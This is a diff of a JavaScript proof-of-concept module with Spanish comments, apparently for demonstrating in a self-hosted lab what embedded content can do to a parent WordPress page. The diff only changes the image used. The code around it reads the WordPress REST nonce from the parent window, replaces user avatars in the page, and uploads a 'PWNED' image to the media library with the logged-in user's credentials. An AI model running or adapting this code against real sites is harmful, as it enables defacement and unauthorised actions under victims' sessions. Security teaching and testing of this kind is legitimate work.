@@ -6,6 +6,8 @@
  * same-origin (legacy) y solo contra un laboratorio propio y desechable.
  */
 
+import { AVATAR_DATA_URI, avatarPng } from './avatar.js';
+
 // Nonce REST: en páginas de wp-admin suele existir wpApiSettings.nonce, o un
 // input[name=_wpnonce]. Cualquier acceso cross-origin lanza y devolvemos null.
 export function wpNonce(win) {
@@ -78,20 +80,18 @@ export function photo(ctx, journal, cb) {
     var w = ctx.parentWin();
     if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
     var root = wpApiRoot(ctx);
-    var c = ctx.win.document.createElement('canvas'); c.width = 96; c.height = 96;
-    var g = c.getContext('2d'); g.fillStyle = '#39ff77'; g.fillRect(0, 0, 96, 96);
-    g.fillStyle = '#b00020'; g.font = 'bold 20px sans-serif'; g.fillText('PWNED', 8, 56);
-    var dataUrl = c.toDataURL('image/png');
+    // Mismo avatar propio (embebido, sin red) que usa la demo de Moodle.
     var avs = w.document.querySelectorAll('img.avatar, #wpadminbar img, .comment-author img');
     for (var i = 0; i < avs.length; i++) {
       if (!avs[i].hasAttribute('data-exe-orig')) { avs[i].setAttribute('data-exe-orig', avs[i].src); }
-      avs[i].src = dataUrl; avs[i].style.outline = '2px solid #b00020';
+      avs[i].src = AVATAR_DATA_URI; avs[i].style.outline = '2px solid #b00020';
     }
     res.avatarSwappedInDom = avs.length;
     var nonce = wpNonce(w);
     if (!nonce) { res.mediaUpload = 'sin nonce REST (abre wp-admin)'; cb(JSON.stringify(res, null, 2)); return; }
-    c.toBlob(function (blob) {
-      var fd = new FormData(); fd.append('file', blob, 'pwned-troll.png'); fd.append('title', 'PWNED by embedded content');
+    avatarPng(ctx.win, 256, function (blob) {
+      if (!blob) { res.mediaUpload = 'img-render-fail (sin canvas)'; cb(JSON.stringify(res, null, 2)); return; }
+      var fd = new FormData(); fd.append('file', blob, 'pwned-avatar.png'); fd.append('title', 'PWNED by embedded content');
       w.fetch(root + 'wp/v2/media', { method: 'POST', credentials: 'same-origin', headers: { 'X-WP-Nonce': nonce }, body: fd })
         .then(function (rr) { return rr.json().catch(function () { return {}; }).then(function (j) {
             if (rr.ok) {
@@ -110,7 +110,7 @@ export function photo(ctx, journal, cb) {
           }); })
         .catch(function (e) { res.mediaUpload = 'ERR:' + e.name; })
         .then(function () { cb(JSON.stringify(res, null, 2)); });
-    }, 'image/png');
+    });
   } catch (e) { cb('BLOQUEADO: ' + e.name + ' (origen opaco / modo secure)'); }
 }
 
